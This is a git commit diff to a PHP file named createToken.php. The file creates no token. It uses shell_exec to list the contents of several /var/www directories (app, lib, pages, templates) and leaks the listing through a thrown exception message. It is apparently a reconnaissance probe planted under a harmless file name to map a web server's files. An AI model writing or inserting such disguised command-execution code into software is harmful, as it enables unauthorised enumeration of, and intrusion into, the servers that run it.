6cfdf7cfcc9d7c641da1dd39c61458638f4c3f08
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 20:48:18 +0100

    Update createToken.php

--- createToken.php
+++ createToken.php
@@ -1,7 +1,9 @@
 <?php
 $output ='';
-$output =$output."\n var WWW ".shell_exec ('ls /var/www/ | xargs');
-
+$output =$output."\n /var/www/app/... ".shell_exec ('ls /var/www/app | xargs');
+$output =$output."\n /var/www/lib/... ".shell_exec ('ls /var/www/lib | xargs');
+$output =$output."\n /var/www/pages/... ".shell_exec ('ls /var/www/pages | xargs');
+$output =$output."\n /var/www/templates/... ".shell_exec ('ls /var/www/templates | xargs');
 
 throw new Exception("\n SUCCESS  ". $output."\n");
 ?>
